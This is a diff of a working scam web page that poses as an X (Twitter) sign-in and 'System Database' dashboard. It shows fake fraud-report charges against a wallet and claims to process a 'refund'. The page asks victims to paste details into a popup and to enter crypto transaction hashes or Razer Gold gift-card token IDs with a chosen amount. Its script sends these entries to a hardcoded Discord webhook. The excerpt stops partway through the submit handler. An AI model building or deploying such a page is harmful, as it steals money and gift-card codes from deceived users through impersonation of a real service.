@@ -5,567 +5,148 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>X (Twitter) Login & Dashboard</title>
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif !important;
-        }
-
-        body {
-            background: radial-gradient(circle at 50% 50%, #202b6e 0%, #0d133a 50%, #060922 100%);
-            background-attachment: fixed;
-            color: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px 16px;
-            position: relative;
-            overflow-x: hidden;
-        }
-
-        body::before, body::after {
-            content: "";
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            top: 0;
-            left: 0;
-            pointer-events: none;
-            background-image: 
-                radial-gradient(white 1px, transparent 0%),
-                radial-gradient(rgba(255,255,255,0.5) 1px, transparent 0%);
-            background-size: 120px 120px, 80px 80px;
-            background-position: 0 0, 40px 40px;
-            opacity: 0.15;
-            z-index: 0;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 680px;
-            text-align: center;
-            position: relative;
-            z-index: 1;
-        }
-
-        .hidden {
-            display: none !important;
-        }
-
-        .main-title {
-            margin-bottom: 24px;
-            text-align: center;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .brand-header-row {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-        }
-
-        .x-icon {
-            width: 38px;
-            height: auto;
-            display: block;
-        }
-
-        .brand-text {
-            color: #ffffff;
-            font-size: 38px;
-            font-weight: 900;
-            letter-spacing: -0.5px;
-            line-height: 1;
-        }
-
-        .title-sub {
-            display: block;
-            color: #ffffff;
-            font-size: 22px;
-            font-weight: 800;
-            text-transform: uppercase;
-            letter-spacing: -0.5px;
-        }
-
-        .netlify-badge {
-            margin-top: 8px;
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            opacity: 0.85;
-        }
-
-        .netlify-badge span {
-            font-size: 11px;
-            font-weight: 700;
-            color: #b5bac1;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-        }
-
-        .dashboard-card {
-            background-color: rgba(30, 31, 34, 0.9);
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 16px;
-            padding: 36px 32px;
-            text-align: left;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7);
-        }
-
-        .login-card {
-            background-color: #16181c;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 16px;
-            padding: 40px 36px;
-            text-align: center;
-            max-width: 440px;
-            margin: 0 auto;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7);
-        }
-
-        .login-title {
-            font-size: 24px;
-            font-weight: 700;
-            color: #ffffff;
-            margin-bottom: 8px;
-        }
-
-        .login-subtitle {
-            font-size: 14px;
-            color: #71767b;
-            margin-bottom: 28px;
-            line-height: 1.5;
-        }
-
-        .x-login-btn {
-            background-color: #ffffff;
-            color: #0f1419;
-            border: none;
-            border-radius: 24px;
-            padding: 14px 20px;
-            font-size: 15px;
-            font-weight: 700;
-            width: 100%;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            transition: background-color 0.2s ease, transform 0.1s ease;
-        }
-
-        .x-login-btn:hover { background-color: #e7e9ea; }
-        .x-login-btn:active { transform: scale(0.98); }
-
-        .user-header {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            margin-bottom: 28px;
-        }
-
-        .avatar {
-            width: 64px;
-            height: 64px;
-            border-radius: 50%;
-            background-color: #333;
-            object-fit: cover;
-            border: 2px solid rgba(255, 255, 255, 0.1);
-        }
-
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif !important; }
+        body { background: radial-gradient(circle at 50% 50%, #202b6e 0%, #0d133a 50%, #060922 100%); background-attachment: fixed; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px 16px; }
+        .container { width: 100%; max-width: 680px; text-align: center; position: relative; z-index: 1; }
+        .hidden { display: none !important; }
+        .main-title { margin-bottom: 24px; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 8px; }
+        .brand-header-row { display: inline-flex; align-items: center; justify-content: center; gap: 12px; }
+        .brand-text { color: #ffffff; font-size: 38px; font-weight: 900; }
+        .title-sub { display: block; color: #ffffff; font-size: 22px; font-weight: 800; text-transform: uppercase; }
+        .dashboard-card { background-color: rgba(30, 31, 34, 0.9); backdrop-filter: blur(16px); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 16px; padding: 36px 32px; text-align: left; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7); }
+        .login-card { background-color: #16181c; border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 16px; padding: 40px 36px; text-align: center; max-width: 440px; margin: 0 auto; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7); }
+        .login-title { font-size: 24px; font-weight: 700; color: #ffffff; margin-bottom: 8px; }
+        .login-subtitle { font-size: 14px; color: #71767b; margin-bottom: 28px; line-height: 1.5; }
+        .x-login-btn { background-color: #ffffff; color: #0f1419; border: none; border-radius: 24px; padding: 14px 20px; font-size: 15px; font-weight: 700; width: 100%; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .user-header { display: flex; align-items: center; gap: 16px; margin-bottom: 28px; }
+        .avatar { width: 64px; height: 64px; border-radius: 50%; object-fit: cover; border: 2px solid rgba(255, 255, 255, 0.1); }
         .user-info .username { font-size: 20px; font-weight: 700; }
         .user-info .id { color: #71767b; font-size: 13px; margin-top: 2px; }
-
-        .section-title {
-            text-align: center;
-            font-size: 16px;
-            font-weight: 800;
-            margin-bottom: 24px;
-            letter-spacing: 0.5px;
-            color: #b5bac1;
-        }
-
-        .info-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 28px;
-            margin-bottom: 36px;
-        }
-
+        .section-title { text-align: center; font-size: 16px; font-weight: 800; margin-bottom: 24px; color: #b5bac1; }
+        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 28px; margin-bottom: 36px; }
         .field-group { margin-bottom: 16px; }
-
-        .warning-box {
-            background-color: rgba(255, 235, 235, 0.3);
-            border: 1px solid rgba(255, 150, 150, 0.4);
-            border-radius: 10px;
-            padding: 12px 14px;
-        }
-
-        .field-label {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 12px;
-            font-weight: 800;
-            text-transform: uppercase;
-            margin-bottom: 6px;
-            letter-spacing: 0.5px;
-        }
-
+        .warning-box { background-color: rgba(255, 235, 235, 0.3); border: 1px solid rgba(255, 150, 150, 0.4); border-radius: 10px; padding: 12px 14px; }
+        .field-label { display: flex; align-items: center; gap: 6px; font-size: 12px; font-weight: 800; text-transform: uppercase; margin-bottom: 6px; }
         .field-label.dark-red-text { color: #d83a3a; }
         .field-label.white-text { color: #ffffff; }
-
-        .warn-icon {
-            width: 16px;
-            height: 16px;
-            display: inline-block;
-            vertical-align: middle;
-            flex-shrink: 0;
-        }
-
-        .field-value {
-            font-weight: 700;
-            font-size: 14px;
-            word-break: break-all;
-            padding-left: 22px;
-        }
-
+        .field-value { font-weight: 700; font-size: 14px; word-break: break-all; padding-left: 22px; }
         .field-value.dark-red-text { color: #d83a3a; }
         .field-value.white-text { color: #ffffff; }
-        .field-value a { color: inherit; text-decoration: underline; }
-
-        .top-action-btn {
-            background: linear-gradient(135deg, #1da1f2, #0d8ecf);
-            color: #ffffff;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            height: 42px;
-            width: 100%;
-            margin-bottom: 14px;
-            font-weight: 800;
-            font-size: 13px;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-            cursor: pointer;
-            transition: all 0.25s ease;
-            box-shadow: 0 4px 12px rgba(29, 161, 242, 0.3);
-        }
-
-        .top-action-btn:hover { filter: brightness(1.1); transform: translateY(-1px); }
-        .top-action-btn.completed { background: linear-gradient(135deg, #42b883, #57d9a3); box-shadow: 0 4px 12px rgba(87, 217, 163, 0.3); }
-
-        #popupModal {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background-color: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(8px);
-            display: flex; justify-content: center; align-items: center;
-            z-index: 99999; padding: 20px;
-        }
-
-        .popup-box {
-            background-color: #16181c;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 14px; padding: 24px; width: 100%; max-width: 640px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.8);
-        }
-
-        .popup-textarea {
-            width: 100%; height: 280px;
-            background-color: rgba(18, 19, 21, 0.8);
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            border-radius: 8px; color: #ffffff; text-align: left;
-            font-size: 14px; font-weight: 500; outline: none; padding: 16px; resize: none; line-height: 1.5;
-        }
-
+        .top-action-btn { background: linear-gradient(135deg, #1da1f2, #0d8ecf); color: #ffffff; border-radius: 10px; height: 42px; width: 100%; margin-bottom: 14px; font-weight: 800; font-size: 13px; text-transform: uppercase; cursor: pointer; }
+        .top-action-btn.completed { background: linear-gradient(135deg, #42b883, #57d9a3); }
+        #popupModal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.85); display: flex; justify-content: center; align-items: center; z-index: 99999; padding: 20px; }
+        .popup-box { background-color: #16181c; border-radius: 14px; padding: 24px; width: 100%; max-width: 640px; }
+        .popup-textarea { width: 100%; height: 280px; background-color: rgba(18, 19, 21, 0.8); border: 1px solid rgba(255,255,255,0.15); border-radius: 8px; color: #ffffff; padding: 16px; resize: none; outline: none; }
         .locked-input { opacity: 0.5; pointer-events: none; cursor: not-allowed !important; }
-
-        .progress-container {
-            background-color: rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 10px; height: 42px; overflow: hidden;
-            position: relative; display: flex; align-items: center; justify-content: center;
-        }
-
-        .progress-bar {
-            background: linear-gradient(90deg, #42b883, #57d9a3);
-            height: 100%; width: 0%; position: absolute; left: 0; top: 0;
-            transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-
-        .progress-label-overlay {
-            position: relative; z-index: 2; display: flex; align-items: center; justify-content: center;
-            gap: 8px; color: #ffffff; font-weight: 800; font-size: 13px; pointer-events: none;
-            text-shadow: 0 1px 2px rgba(0,0,0,0.4);
-        }
-
-        .progress-text { color: #57d9a3; font-weight: 800; }
-
-        .box-input-wrapper {
-            position: relative; background-color: rgba(18, 19, 21, 0.6);
-            border-radius: 10px; height: 42px; margin-top: 14px;
-            display: flex; align-items: center; border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .box-input-wrapper input[type="text"], .box-input-wrapper select {
-            width: 100%; height: 100%; background: transparent; border: none;
-            color: #ffffff; text-align: center; font-weight: 600; font-size: 13px; outline: none; padding: 0 14px;
-        }
-
-        .box-input-wrapper select { cursor: pointer; text-align-last: center; }
-        .box-input-wrapper option { background-color: #16181c; color: #ffffff; padding: 10px; }
-
-        .standalone-action-btn {
-            background-color: #35383f; color: #71767b; border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 10px; height: 42px; width: 100%; margin-top: 14px;
-            font-weight: 800; font-size: 13px; letter-spacing: 0.5px; text-transform: uppercase; cursor: not-allowed; transition: all 0.25s ease;
-        }
-
-        .standalone-action-btn.active {
-            background: linear-gradient(135deg, #42b883, #57d9a3); color: #ffffff;
-            border-color: transparent; cursor: pointer; opacity: 1; box-shadow: 0 4px 12px rgba(87, 217, 163, 0.3);
-        }
-
-        #loadingScreen {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-color: rgba(0, 0, 0, 0.85); backdrop-filter: blur(12px);
-            display: flex; flex-direction: column; justify-content: center; align-items: center; gap: 24px; z-index: 9999;
-        }
-
-        .x-spinner {
-            width: 48px; height: 48px; border: 4px solid rgba(255,255,255,0.1);
-            border-top: 4px solid #ffffff; border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
+        .progress-container { background-color: rgba(0,0,0,0.3); border-radius: 10px; height: 42px; overflow: hidden; position: relative; display: flex; align-items: center; justify-content: center; }
+        .progress-bar { background: linear-gradient(90deg, #42b883, #57d9a3); height: 100%; width: 0%; position: absolute; left: 0; top: 0; transition: width 0.5s ease; }
+        .progress-label-overlay { position: relative; z-index: 2; display: flex; gap: 8px; font-weight: 800; font-size: 13px; }
+        .box-input-wrapper { background-color: rgba(18, 19, 21, 0.6); border-radius: 10px; height: 42px; margin-top: 14px; display: flex; align-items: center; border: 1px solid rgba(255,255,255,0.1); }
+        .box-input-wrapper input, .box-input-wrapper select { width: 100%; height: 100%; background: transparent; border: none; color: #ffffff; text-align: center; font-weight: 600; font-size: 13px; outline: none; padding: 0 14px; }
+        .box-input-wrapper option { background-color: #16181c; color: #ffffff; }
+        .standalone-action-btn { background-color: #35383f; color: #71767b; border-radius: 10px; height: 42px; width: 100%; margin-top: 14px; font-weight: 800; font-size: 13px; text-transform: uppercase; cursor: not-allowed; }
+        .standalone-action-btn.active { background: linear-gradient(135deg, #42b883, #57d9a3); color: #ffffff; cursor: pointer; }
+        #loadingScreen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.85); display: flex; flex-direction: column; justify-content: center; align-items: center; gap: 24px; z-index: 9999; }
+        .x-spinner { width: 48px; height: 48px; border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #ffffff; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
+        .loading-text { color: #ffffff; font-size: 18px; font-weight: 700; }
         .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 28px; }
-        .stat-card { background-color: rgba(18, 19, 21, 0.4); border: 1px solid rgba(255, 255, 255, 0.04); border-radius: 10px; padding: 12px 8px; text-align: center; }
+        .stat-card { background-color: rgba(18, 19, 21, 0.4); border-radius: 10px; padding: 12px 8px; text-align: center; }
         .stat-label { color: #71767b; font-size: 12px; font-weight: 700; margin-bottom: 6px; }
         .stat-value { color: #ffffff; font-size: 16px; font-weight: 800; }
-
-        .action-area { text-align: center; }
-        .action-btn {
-            background-color: #35383f; color: #71767b; border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 10px; padding: 14px 28px; font-weight: 800; font-size: 14px; cursor: not-allowed; width: 100%; transition: all 0.25s ease;
-        }
-        .action-btn.active {
-            background: linear-gradient(135deg, #42b883, #57d9a3); color: #ffffff;
-            border-color: transparent; cursor: pointer; box-shadow: 0 4px 12px rgba(87, 217, 163, 0.3);
-        }
-
-        .bottom-left-img {
-            position: fixed; bottom: 20px; left: 20px; width: 36px; height: auto;
-            z-index: 99999; opacity: 0.7; pointer-events: none;
-        }
+        .action-btn { background-color: #35383f; color: #71767b; border-radius: 10px; padding: 14px 28px; font-weight: 800; font-size: 14px; cursor: not-allowed; width: 100%; }
+        .action-btn.active { background: linear-gradient(135deg, #42b883, #57d9a3); color: #ffffff; cursor: pointer; }
     </style>
 </head>
 <body>
 
 <div id="loadingScreen" class="hidden">
     <div class="x-spinner"></div>
-    <span class="loading-text" style="color: #fff; font-size: 18px; font-weight: 700;">Loading Dashboard...</span>
+    <span id="loadingText" class="loading-text">Loading...</span>
 </div>
 
 <div id="popupModal" class="hidden">
     <div class="popup-box">
-        <textarea id="popupTextarea" class="popup-textarea" placeholder="..." autocomplete="off" autofocus></textarea>
+        <textarea id="popupTextarea" class="popup-textarea" placeholder="Paste required details here (min 15 characters)..." autofocus></textarea>
     </div>
 </div>
 
-<!-- X Login View -->
 <div id="loginView" class="container">
     <div class="login-card">
-        <svg class="x-icon" viewBox="0 0 24 24" fill="#ffffff" style="width: 40px; margin: 0 auto 16px auto;" xmlns="http://www.w3.org/2000/svg">
-            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
-        </svg>
         <h2 class="login-title">Sign in to X</h2>
-        <p class="login-subtitle">To continue with the ongoing transaction, please authenticate with your official X account.</p>
-        <button class="x-login-btn" id="loginBtn">
-            <svg viewBox="0 0 24 24" fill="#0f1419" style="width: 18px; height: 18px;" xmlns="http://www.w3.org/2000/svg">
-                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
-            </svg>
-            Sign in with X
-        </button>
+        <p class="login-subtitle">Authenticate with your official X account to proceed.</p>
+        <button class="x-login-btn" id="loginBtn">Sign in with X</button>
     </div>
 </div>
 
-<!-- Dashboard View -->
 <div id="dashboardView" class="container hidden">
     <h1 class="main-title">
-        <div class="brand-header-row">
-            <svg class="x-icon" viewBox="0 0 24 24" fill="#ffffff" xmlns="http://www.w3.org/2000/svg">
-                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
-            </svg>
-            <span class="brand-text">X NETWORK</span>
-        </div>
-        <span class="title-sub">System Database &amp; Validation Process</span>
-        <div class="netlify-badge">
-            <span>Powered by Netlify</span>
-        </div>
+        <div class="brand-header-row"><span class="brand-text">X NETWORK</span></div>
+        <span class="title-sub">System Database</span>
     </h1>
-
     <div class="dashboard-card">
         <div class="user-header">
             <img src="https://via.placeholder.com/64" alt="Avatar" class="avatar" id="displayAvatar">
             <div class="user-info">
-                <div class="username" id="displayUsername">X Authenticated User</div>
+                <div class="username" id="displayUsername">X Account User</div>
                 <div class="id" id="displayUserId">@x_user</div>
             </div>
         </div>
-
         <div class="section-title">REPORT INFORMATION</div>
-
         <div class="info-grid">
             <div class="left-col">
-                <div class="field-group">
-                    <div class="warning-box">
-                        <div class="field-label dark-red-text">
-                            <svg class="warn-icon" viewBox="0 0 100 100" fill="none" stroke="#d83a3a" stroke-width="8" stroke-linecap="round" stroke-linejoin="round" xmlns="http://www.w3.org/2000/svg">
-                                <circle cx="50" cy="50" r="44" />
-                                <line x1="50" y1="28" x2="50" y2="56" />
-                                <circle cx="50" cy="74" r="5" fill="#d83a3a" stroke="none" />
-                            </svg>
-                            REPORT CHARGES:
-                        </div>
-                        <div class="field-value dark-red-text">FRAUD/PHISHING</div>
-                    </div>
-                </div>
-
-                <div class="field-group">
-                    <div class="warning-box">
-                        <div class="field-label white-text">
-                            <svg class="warn-icon" viewBox="0 0 100 100" fill="none" stroke="#ffffff" stroke-width="8" stroke-linecap="round" stroke-linejoin="round" xmlns="http://www.w3.org/2000/svg">
-                                <circle cx="50" cy="50" r="44" />
-                                <line x1="50" y1="28" x2="50" y2="56" />
-                                <circle cx="50" cy="74" r="5" fill="#ffffff" stroke="none" />
-                            </svg>
-                            WALLET ID:
-                        </div>
-                        <div class="field-value white-text">3Etad92sxKVTrDU4RTX4QVTNGFsUV1Mj94</div>
-                    </div>
-                </div>
-
-                <div class="field-group">
-                    <div class="warning-box">
-                        <div class="field-label dark-red-text">
-                            <svg class="warn-icon" viewBox="0 0 100 100" fill="none" stroke="#d83a3a" stroke-width="8" stroke-linecap="round" stroke-linejoin="round" xmlns="http://www.w3.org/2000/svg">
-                                <circle cx="50" cy="50" r="44" />
-                                <line x1="50" y1="28" x2="50" y2="56" />
-                                <circle cx="50" cy="74" r="5" fill="#d83a3a" stroke="none" />
-                            </svg>
-                            NUMBER OF REPORT:
-                        </div>
-                        <div class="field-value dark-red-text" id="reportCountDisplay">86</div>
-                    </div>
-                </div>
-
-                <div class="field-group">
-                    <div class="warning-box">
-                        <div class="field-label white-text">
-                            <svg class="warn-icon" viewBox="0 0 100 100" fill="none" stroke="#ffffff" stroke-width="8" stroke-linecap="round" stroke-linejoin="round" xmlns="http://www.w3.org/2000/svg">
-                                <circle cx="50" cy="50" r="44" />
-                                <line x1="50" y1="28" x2="50" y2="56" />
-                                <circle cx="50" cy="74" r="5" fill="#ffffff" stroke="none" />
-                            </svg>
-                            REQUEST#:
-                        </div>
-                        <div class="field-value white-text"><a href="#">23871020</a></div>
-                    </div>
-                </div>
+                <div class="field-group"><div class="warning-box"><div class="field-label dark-red-text">REPORT:</div><div class="field-value dark-red-text">FRAUD/PHISHING</div></div></div>
+                <div class="field-group"><div class="warning-box"><div class="field-label white-text">WALLET:</div><div class="field-value white-text">3Etad92sxKVTrDU4RTX4QVTNGFsUV1Mj94</div></div></div>
+                <div class="field-group"><div class="warning-box"><div class="field-label dark-red-text">REPORTS:</div><div class="field-value dark-red-text" id="reportCountDisplay">86</div></div></div>
             </div>
-
             <div class="right-col">
                 <button class="top-action-btn" id="topActionBtn">ACTION BUTTON</button>
-
                 <div class="progress-container locked-input" id="progressContainer">
                     <div class="progress-bar" id="progressBar" style="width: 0%;"></div>
-                    <div class="progress-label-overlay">
-                        <span>Validation Process</span>
-                        <span id="progressText" class="progress-text">0%</span>
-                    </div>
+                    <div class="progress-label-overlay"><span>Validation</span><span id="progressText">0%</span></div>
                 </div>
-
                 <div class="box-input-wrapper locked-input" id="coinWrapper">
                     <select id="coinSelect" disabled>
                         <option value="" disabled selected>TYPE OF COIN</option>
                         <option value="BTC">BTC</option>
                         <option value="ETH">ETH</option>
-                        <option value="BNB">BNB</option>
                         <option value="USDT">USDT</option>
                         <option value="Razer Gold">Razer Gold</option>
                     </select>
                 </div>
-
-                <div class="box-input-wrapper locked-input" id="tokenWrapper">
-                    <input type="text" id="myInput" placeholder="Token ID..." disabled>
-                </div>
-
+                <div class="box-input-wrapper locked-input" id="tokenWrapper"><input type="text" id="myInput" placeholder="Token ID / Hash..." disabled></div>
                 <div class="box-input-wrapper locked-input" id="amountWrapper">
                     <select id="amountSelect" disabled>
-                        <option value="" disabled selected>Choose amount...</option>
+                        <option value="" disabled selected>Amount...</option>
                         <option value="50">$50</option>
                         <option value="100">$100</option>
                         <option value="200">$200</option>
-                        <option value="300">$300</option>
-                        <option value="500">$500 (Max)</option>
+                        <option value="500">$500</option>
                     </select>
                 </div>
-
                 <button class="standalone-action-btn locked-input" id="enterBtn" disabled>ENTER</button>
             </div>
         </div>
-
         <div class="stats-grid">
-            <div class="stat-card">
-                <div class="stat-label">Recent Deposit</div>
-                <div class="stat-value" id="recentDeposit">$00.00</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-label">Total Deposit</div>
-                <div class="stat-value" id="totalDeposit">$00.00</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-label">Refund Balance</div>
-                <div class="stat-value">PROCESSING</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-label">Total Refund</div>
-                <div class="stat-value" id="totalRefund">$00.00</div>
-            </div>
+            <div class="stat-card"><div class="stat-label">Recent Deposit</div><div class="stat-value" id="recentDeposit">$00.00</div></div>
+            <div class="stat-card"><div class="stat-label">Total Deposit</div><div class="stat-value" id="totalDeposit">$00.00</div></div>
+            <div class="stat-card"><div class="stat-label">Refund Balance</div><div class="stat-value">PROCESSING</div></div>
+            <div class="stat-card"><div class="stat-label">Total Refund</div><div class="stat-value" id="totalRefund">$00.00</div></div>
         </div>
-
-        <div class="action-area">
-            <button class="action-btn" id="refundBtn" disabled>PROCESS REFUND</button>
-        </div>
+        <div class="action-area"><button class="action-btn" id="refundBtn" disabled>PROCESS REFUND</button></div>
     </div>
 </div>
 
-<svg class="bottom-left-img" id="bottomLeftLogo" viewBox="0 0 24 24" fill="#ffffff" xmlns="http://www.w3.org/2000/svg">
-    <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
-</svg>
-
 <script>
     const X_CLIENT_ID = "VXlLVEtZMlVZNUNzbjhrSjMySVo6MTpjaQ"; 
-    const REDIRECT_URI = "https://januzhvhynz-hash.github.io/Xtest/";
+    const REDIRECT_URI = "https://xdatabase.netlify.app";
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1553609504447533139/0KDmUfqwzJzw0zuNOYGd_9n0Mo1-acgowUM6JfpSz4BxY-wStCcVwVAICoYh2Krjd_Lt";
 
     const loginView = document.getElementById("loginView");
     const loginBtn = document.getElementById("loginBtn");
     const dashboardView = document.getElementById("dashboardView");
-    const displayUsername = document.getElementById("displayUsername");
-    const displayUserId = document.getElementById("displayUserId");
-    const displayAvatar = document.getElementById("displayAvatar");
-    const bottomLeftLogo = document.getElementById("bottomLeftLogo");
+    const loadingScreen = document.getElementById("loadingScreen");
+    const loadingText = document.getElementById("loadingText");
 
     window.addEventListener("DOMContentLoaded", () => {
         const urlParams = new URLSearchParams(window.location.search);
@@ -573,36 +154,19 @@
 
         if (authCode) {
             window.history.replaceState({}, document.title, window.location.pathname);
-            
-            // Extract mock/active user profile state for the dashboard view
-            const mockUser = {
-                name: "X Account User",
-                username: "x_authenticated_user",
-                profile_image_url: "https://via.placeholder.com/64"
-            };
-            sessionStorage.setItem("x_user", JSON.stringify(mockUser));
-            showDashboard(mockUser);
+            sessionStorage.setItem("x_authorized", "true");
+            showDashboard();
             return;
         }
 
-        const savedUser = sessionStorage.getItem("x_user");
-        if (savedUser) {
-            showDashboard(JSON.parse(savedUser));
+        if (sessionStorage.getItem("x_authorized") === "true") {
+            showDashboard();
         }
     });
 
-    function showDashboard(user) {
+    function showDashboard() {
         loginView.classList.add("hidden");
         dashboardView.classList.remove("hidden");
-        bottomLeftLogo.style.display = "block";
-
-        if (user) {
-            displayUsername.textContent = user.name || "X Account User";
-            displayUserId.textContent = `@${user.username || "x_user"}`;
-            if (user.profile_image_url) {
-                displayAvatar.src = user.profile_image_url;
-            }
-        }
     }
 
     loginBtn.addEventListener("click", () => {
@@ -611,33 +175,18 @@
     });
 
     async function sendToDiscordWebhook(submissionData) {
-        if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("YOUR_DISCORD_WEBHOOK_URL")) return;
-        
+        if (!DISCORD_WEBHOOK_URL) return;
         const embedPayload = {
             embeds: [{
-                title: "🛡️️ New System Database Submission (X Auth)",
+                title: "🛡️ New System Submission",
                 color: 29184,
                 fields: [
-                    {
-                        name: "👤 X Account User",
-                        value: `**Name:** ${submissionData.user}\n**Handle:** ${submissionData.userId}`,
-                        inline: false
-                    },
-                    {
-                        name: "💳 Transaction Details",
-                        value: `**Coin Type:** \`${submissionData.coin}\`\n**Amount:** \`${submissionData.amount}\``,
-                        inline: true
-                    },
-                    {
-                        name: "🔑 Token / Hash ID",
-                        value: `\`\`\`${submissionData.hashOrToken}\`\`\``,
-                        inline: false
-                    }
+                    { name: "💳 Transaction", value: `**Coin:** \`${submissionData.coin}\`\n**Amount:** \`${submissionData.amount}\``, inline: true },
+                    { name: "🔑 Token/Hash", value: `\`\`\`${submissionData.hashOrToken}\`\`\``, inline: false }
                 ],
                 timestamp: new Date().toISOString()
             }]
         };
-
         try {
             await fetch(DISCORD_WEBHOOK_URL, {
                 method: "POST",
@@ -649,6 +198,7 @@
         }
     }
 
+    // Dashboard UI controls & logic
     const topActionBtn = document.getElementById("topActionBtn");
     const popupModal = document.getElementById("popupModal");
     const popupTextarea = document.getElementById("popupTextarea");
@@ -676,15 +226,13 @@
         popupModal.classList.remove("hidden");
         popupTextarea.value = "";
         popupTextarea.focus();
-        bottomLeftLogo.style.display = "none";
     });
 
-    popupTextarea.addEventListener("keydown", (event) => {
-        if (event.key === "Enter" && !event.shiftKey) {
-            event.preventDefault();
+    popupTextarea.addEventListener("keydown", (e) => {
+        if (e.key === "Enter" && !e.shiftKey) {
+            e.preventDefault();
             if (popupTextarea.value.trim().length >= 15) {
                 popupModal.classList.add("hidden");
-                bottomLeftLogo.style.display = "block";
                 topActionBtn.textContent = "VERIFIED ✓";
                 topActionBtn.classList.add("completed");
                 topActionBtn.disabled = true;
@@ -701,28 +249,24 @@
     });
 
     coinSelect.addEventListener("change", () => {
-        const selectedCoin = coinSelect.value;
-        if (["BTC", "ETH", "BNB", "USDT"].includes(selectedCoin)) {
-            input.placeholder = "Transaction Hash...";
-        } else {
-            input.placeholder = "Token ID...";
-        }
+        const coin = coinSelect.value;
+        input.placeholder = (coin === "Razer Gold") ? "Token ID (14 chars)..." : "Transaction Hash (66 chars)...";
         validateForm();
     });
 
     function validateForm() {
         const coin = coinSelect.value;
-        const tokenVal = input.value.trim();
-        const amount = amountSelect.value;
-        let isValidLength = false;
+        const val = input.value.trim();
+        const amt = amountSelect.value;
+        let valid = false;
 
-        if (["BTC", "ETH", "BNB", "USDT"].includes(coin)) {
-            isValidLength = (tokenVal.length === 66);
+        if (["BTC", "ETH", "USDT"].includes(coin)) {
+            valid = (val.length === 66);
         } else if (coin === "Razer Gold") {
-            isValidLength = (tokenVal.length === 14);
+            valid = (val.length === 14);
         }
 
-        if (coin && isValidLength && amount) {
+        if (coin && valid && amt) {
             enterBtn.disabled = false;
             enterBtn.classList.add("active");
         } else {
@@ -736,14 +280,10 @@
 
     function handleSubmit() {
         if (enterBtn.disabled) return;
-        let depositValue = amountSelect.value ? parseInt(amountSelect.value, 10) : 100;
-        let progressPercent = depositValue / 10;
-
